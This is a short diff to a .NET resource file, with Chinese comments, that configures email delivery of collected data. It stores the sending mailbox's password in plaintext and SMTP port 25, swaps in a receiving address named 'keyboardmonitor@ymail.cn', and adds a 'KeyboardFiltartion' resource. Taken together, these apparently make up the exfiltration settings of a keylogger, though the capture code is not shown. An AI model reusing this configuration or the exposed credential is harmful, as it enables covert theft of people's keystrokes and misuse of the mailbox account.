@@ -145,12 +145,15 @@
     <value>hnlklpxftpzdcbec</value>
     <comment>发送数据的邮箱地址密码</comment>
   </data>
-  <data name="ToDataEmail" xml:space="preserve">
-    <value>2646016915@qq.com</value>
-    <comment>接收数据的邮箱地址</comment>
-  </data>
   <data name="EmailServicePort" xml:space="preserve">
     <value>25</value>
     <comment>发送邮件服务器的端口</comment>
+  </data>
+  <data name="KeyboardFiltartion1" type="System.Resources.ResXFileRef, System.Windows.Forms">
+    <value>..\Resources\KeyboardFiltartion.json;System.Byte[], mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089</value>
+  </data>
+  <data name="ToDataEmail" xml:space="preserve">
+    <value>keyboardmonitor@ymail.cn</value>
+    <comment>接收邮件的邮箱</comment>
   </data>
 </root>
